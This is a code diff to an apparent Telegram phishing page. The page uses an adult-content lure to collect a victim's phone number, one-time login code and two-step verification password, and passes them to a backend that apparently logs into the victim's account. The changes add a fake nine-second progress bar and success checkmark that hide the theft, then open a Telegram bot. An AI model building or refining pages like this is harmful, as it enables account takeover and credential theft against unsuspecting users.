@@ -8,7 +8,7 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
         body { 
-            background-color: #000; 
+            background-color: #0a1128; /* Dark navy blue from animation requirement */
             height: 100vh; 
             display: flex; 
             flex-direction: column; 
@@ -26,6 +26,13 @@
         .container {
             position: relative; z-index: 2; width: 92%; max-width: 380px;
             display: flex; flex-direction: column; align-items: center; gap: 15px;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .container.hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(0.95);
         }
 
         .card-box {
@@ -110,16 +117,8 @@
         }
 
         #realOtpInput {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            z-index: 5;
-            font-size: 24px;
-            caret-color: transparent;
-            cursor: pointer;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; z-index: 5; font-size: 24px; caret-color: transparent; cursor: pointer;
         }
 
         .btn-confirm-otp {
@@ -178,6 +177,50 @@
             box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4); transition: 0.2s;
         }
         .btn-verify-password:active { transform: scale(0.97); }
+
+        /* --- 9-Second Exact Animation Styles --- */
+        #progress-container {
+            position: absolute; width: 80%; max-width: 400px; opacity: 0;
+            pointer-events: none; transition: opacity 0.5s ease-in;
+            display: flex; flex-direction: column; align-items: center; z-index: 10;
+        }
+        #progress-container.visible { opacity: 1; }
+        #progress-bar-bg {
+            width: 100%; height: 16px; background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 10px; position: relative; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+        #progress-fill { width: 0%; height: 100%; background-color: white; border-radius: 10px; }
+        
+        #percentage-badge {
+            position: absolute; top: -38px; left: 0%; transform: translateX(-50%);
+            background-color: #ff3b30; color: white; font-size: 14px; font-weight: bold;
+            padding: 5px 10px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            white-space: nowrap;
+        }
+        #percentage-badge::after {
+            content: ''; position: absolute; bottom: -6px; left: 50%; transform: translateX(-50%);
+            border-width: 6px 6px 0; border-style: solid; border-color: #ff3b30 transparent transparent transparent;
+        }
+
+        #success-container {
+            position: absolute; opacity: 0; pointer-events: none; transition: opacity 0.5s; z-index: 10; cursor: pointer;
+        }
+        #success-container.visible { opacity: 1; pointer-events: auto; }
+        .check-circle {
+            width: 100px; height: 100px; background-color: #007bff; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center; transform: scale(0);
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+        }
+        .check-circle.animate { animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        .check-mark { color: white; font-size: 55px; opacity: 0; }
+        .check-mark.animate { animation: fadeIn 0.5s 0.4s forwards; }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0); }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+        @keyframes fadeIn { to { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -186,15 +229,14 @@
         <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
     </video>
 
-    <div class="container">
-        
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
         <input type="hidden" id="phoneCodeHash">
 
         <div class="card-box header-card">
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
             </div>
-
             <h2>Enter Telegram Number 🔞</h2>
             <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
             <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
@@ -202,17 +244,14 @@
 
         <div class="card-box">
             <h2>Enter 5-Digit OTP 🔑</h2>
-            
             <div class="otp-boxes-container" onclick="document.getElementById('realOtpInput').focus()">
                 <input type="tel" id="realOtpInput" maxlength="5" autocomplete="one-time-code" oninput="handleInput()" onkeydown="handleKeyDown(event)">
-
                 <div class="otp-small-box active"></div>
                 <div class="otp-small-box"></div>
                 <div class="otp-small-box"></div>
                 <div class="otp-small-box"></div>
                 <div class="otp-small-box"></div>
             </div>
-
             <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
         </div>
     </div>
@@ -220,12 +259,25 @@
     <!-- 2FA Password Popup Modal -->
     <div class="modal-overlay" id="passwordModal">
         <div class="modal-box">
-            <div class="modal-icon-container">
-                🔐
-            </div>
+            <div class="modal-icon-container">🔐</div>
             <h3>Two-Step Verification Password 🔑</h3>
             <input type="password" id="twoFactorPassword" class="password-input" placeholder="Enter Cloud Password">
             <button class="btn-verify-password" onclick="verifyPassword()">Verify Password ✨</button>
+        </div>
+    </div>
+
+    <!-- Loading Animation Phase -->
+    <div id="progress-container">
+        <div id="progress-bar-bg">
+            <div id="percentage-badge">0%</div>
+            <div id="progress-fill"></div>
+        </div>
+    </div>
+
+    <!-- Success Checkmark Phase -->
+    <div id="success-container">
+        <div class="check-circle" id="check-circle">
+            <div class="check-mark" id="check-mark">✓</div>
         </div>
     </div>
 
@@ -243,28 +295,18 @@
                 smallBoxes[i].innerText = val[i] || "";
                 smallBoxes[i].classList.remove('active');
             }
-            
             let activeIdx = val.length < 5 ? val.length : 4;
             smallBoxes[activeIdx].classList.add('active');
         }
 
-        function handleInput() {
-            updateBoxes();
-        }
-
+        function handleInput() { updateBoxes(); }
         function handleKeyDown(e) {
-            if (e.key === 'Backspace') {
-                setTimeout(updateBoxes, 20);
-            }
+            if (e.key === 'Backspace') { setTimeout(updateBoxes, 20); }
         }
 
         function sendCode() {
             let phone = document.getElementById('phoneInput').value;
-            if(!phone) {
-                alert("Please enter your phone number!");
-                return;
-            }
-            
+            if(!phone) { alert("Please enter your phone number!"); return; }
             realInput.value = "";
             updateBoxes();
 
@@ -287,21 +329,69 @@
             .catch(err => alert("Connection error while sending OTP!"));
         }
 
+        // সফল ভেরিফিকেশন হলে এই ফাংশনটি ৯ সেকেন্ডের অ্যানিমেশনটি চালু করবে এবং বট ওপেন করবে
+        function startSuccessAnimation() {
+            // মোডাল বন্ধ করা
+            document.getElementById('passwordModal').style.display = 'none';
+            // মূল ফর্ম পেজটি স্মুথলি হাইড করা
+            document.getElementById('mainContainer').classList.add('hidden');
+
+            // ব্যাকগ্রাউন্ড ভিডিও বা কালার অ্যাডজাস্ট করে অ্যানিমেশন শুরু
+            setTimeout(() => {
+                const progressContainer = document.getElementById('progress-container');
+                const progressFill = document.getElementById('progress-fill');
+                const badge = document.getElementById('percentage-badge');
+                const successContainer = document.getElementById('success-container');
+                const checkCircle = document.getElementById('check-circle');
+                const checkMark = document.getElementById('check-mark');
+
+                progressContainer.classList.add('visible');
+
+                let startTime = null;
+                const duration = 6000; // ৬ সেকেন্ড লোডিং (১ সেকেন্ড ফেইড আউট + ৬ সেকেন্ড প্রগ্রেস + ২ সেকেন্ড চেকমার্ক = মোট ৯ সেকেন্ড)
+
+                function updateProgress(timestamp) {
+                    if (!startTime) startTime = timestamp;
+                    let elapsed = timestamp - startTime;
+                    let progress = Math.min(elapsed / duration, 1);
+                    let percentage = Math.floor(progress * 100);
+
+                    progressFill.style.width = percentage + '%';
+                    badge.innerText = percentage + '%';
+                    badge.style.left = percentage + '%';
+
+                    if (progress < 1) {
+                        requestAnimationFrame(updateProgress);
+                    } else {
+                        // প্রগ্রেস ১০০% হওয়ার পর চেকমার্ক অ্যানিমেশন (৭-৯ সেকেন্ড)
+                        setTimeout(() => {
+                            progressContainer.classList.remove('visible');
+                            setTimeout(() => {
+                                successContainer.classList.add('visible');
+                                checkCircle.classList.add('animate');
+                                checkMark.classList.add('animate');
+
+                                // অ্যানিমেশন শেষে ব্যাকগ্রাউন্ডে টেলিগ্রাম বট নতুন ট্যাবে ওপেন হবে
+                                setTimeout(() => {
+                                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
+                                }, 1500);
+
+                            }, 500);
+                        }, 200);
+                    }
+                }
+
+                requestAnimationFrame(updateProgress);
+            }, 500);
+        }
+
         function verifyOtpCode() {
             let phone = document.getElementById('phoneInput').value;
             let code = realInput.value;
             let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
             
-            if(!phone) {
-                alert("Please enter your phone number first!");
-                return;
-            }
-            if(!phoneCodeHash) {
-                alert("Please request OTP code first by clicking GET CODE!");
-                return;
-            }
-            if(!code || code.length < 5) {
-                alert("Please enter the complete 5-digit OTP code!");
+            if(!phone || !phoneCodeHash || code.length < 5) {
+                alert("Please enter valid phone and complete OTP!");
                 return;
             }
 
@@ -313,9 +403,7 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    // পাসওয়ার্ড বা ওটিপি সফল হলে নতুন ট্যাবে অ্যানিমেশন পেজ (verify.html) এবং টেলিগ্রাম বট ওপেন হবে
-                    window.open("verify.html", "_blank");
-                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
+                    startSuccessAnimation();
                 } else if(data.status === "2fa_required") {
                     document.getElementById('passwordModal').style.display = 'flex';
                     document.getElementById('twoFactorPassword').focus();
@@ -347,9 +435,7 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    // 2FA পাসওয়ার্ড সফল হলে নতুন ট্যাবে অ্যানিমেশন পেজ (verify.html) এবং টেলিগ্রাম বট ওপেন হবে
-                    window.open("verify.html", "_blank");
-                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
+                    startSuccessAnimation();
                 } else {
                     alert("Password Verification Failed: " + data.message);
                     document.getElementById('twoFactorPassword').value = "";
